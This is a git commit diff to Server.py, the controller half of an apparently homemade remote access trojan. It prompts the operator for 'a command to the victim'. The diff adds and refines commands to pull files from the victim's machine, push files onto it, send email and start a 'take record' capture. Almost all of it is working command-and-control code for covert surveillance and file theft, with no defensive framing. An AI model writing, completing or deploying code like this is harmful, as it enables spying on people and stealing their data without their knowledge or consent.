5b7fa4b4a88eb1bbb20ae84f46bf4808c5e0031c
yehonatan1 <54950358+yehonatan1@users.noreply.github.com>
2020-02-19 08:11:05 -0800

    Update Server.py

--- Server.py
+++ Server.py
@@ -11,8 +11,19 @@ def server():
 
     while True:
         command = input('Please enter a command to the victim\n')
+        # ind = command.index(' ')
+        # action = command.substring(0, ind)
+        # params = command.substring(ind, len(command)-1)
+        # send(command)
+        # if action == "getfile":
+        #
+        #
+        #
+        # elif action == 'downloadfile':
+        #
         server_socket.send(command.encode('utf-8'))
-        if 'get file ' in command:
+
+        if command.startswith('get file '):
             data = None
             file_path = input("Please enter the path of the file\n")
             with open(file_path, 'wb')as f:
@@ -20,13 +31,14 @@ def server():
                 while True:
                     data = server_socket.recv(1024)
                     if not data or len(data) < 1024:
-                        f.write(data)
+                        if data:
+                            f.write(data)
                         f.flush()
                         f.close()
                         break
                     f.write(data)
-        elif 'download file ' in command:
-            command = command.replace('download file ', '')
+        elif command.startswith('download file '):
+            command = command[14:-1] + command[-1]
             victim_path = input('Where do you want to save the file\n')
             server_socket.sendall(victim_path.encode('utf-8'))
             f = open(command, 'rb')
@@ -37,9 +49,17 @@ def server():
                 else:
                     f.close()
                     break
-        elif 'send email ' in command:
+        elif command.startswith('send email '):
             data = server_socket.recv(1024).decode('utf-8')
             print(data)
+
+        elif command.startswith('take record '):
+            command = command[12:-1] + command[-1]
+            server_socket.sendall(command.encode('utf-8'))
+            path = input("Where do you want save the file\n")
+            server_socket.sendall(path.encode('utf-8'))
+
+
 
         else:
             data = server_socket.recv(1024).decode('utf-8')
